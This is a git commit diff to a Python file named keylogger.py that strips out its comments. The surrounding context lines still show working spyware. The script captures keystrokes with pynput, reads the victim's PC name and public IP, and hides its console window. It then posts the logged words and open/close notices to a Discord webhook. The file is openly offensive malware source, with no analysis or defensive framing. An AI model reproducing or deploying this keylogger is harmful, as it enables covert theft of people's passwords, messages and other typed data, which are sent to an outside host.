31150e62a7ae8c52a5b2c237098b6864d947f838
NW69 <138323715+Naturewizard69@users.noreply.github.com>
2023-07-02 23:04:18 -0500

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -10,19 +10,14 @@ from pynput.keyboard import Key, KeyCode
 from queue import Queue
 import threading
 
-# Set up your Discord webhook URL
 webhook_url = "WEBHOOK_LINK_HERE"
 
-# Get the user's PC name
 pc_name = os.getenv('COMPUTERNAME')
 
-# Get the user's public IP address
 public_ip = requests.get("https://httpbin.org/ip").json()["origin"]
 
-# Log when the logger is opened
 requests.post(webhook_url, json={"content": f"{pc_name} ({public_ip}) opened the logger!"})
 
-# Set up the keylogging functions
 current_word = []
 word_buffer = Queue()
 
@@ -42,7 +37,6 @@ def on_press(key):
             char = key.char
             current_word.append(char)
         except AttributeError:
-            # Handle non-character keys separately
             on_special_key_press(key)
 
 def on_release(key):
@@ -84,25 +78,18 @@ def get_key_name(key):
             return "Key.alt"
         elif key == Key.shift_l or key == Key.shift_r:
             return "Key.shift"
-        # Handle other special keys
-        # ...
     else:
         return str(key) if key is not None else None
 
-# Hide the console window
 win = win32console.GetConsoleWindow()
 win32gui.ShowWindow(win, 0)
 
-# Create and start the listener for character keys
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    # Start a thread to send the logged words to the webhook
     sender_thread = threading.Thread(target=send_words_to_webhook)
     sender_thread.start()
 
     listener.join()
 
-    # Wait for the sender thread to finish
     sender_thread.join()
 
-# Log when the logger is closed
 requests.post(webhook_url, json={"content": f"{pc_name} ({public_ip}) closed the logger!"})
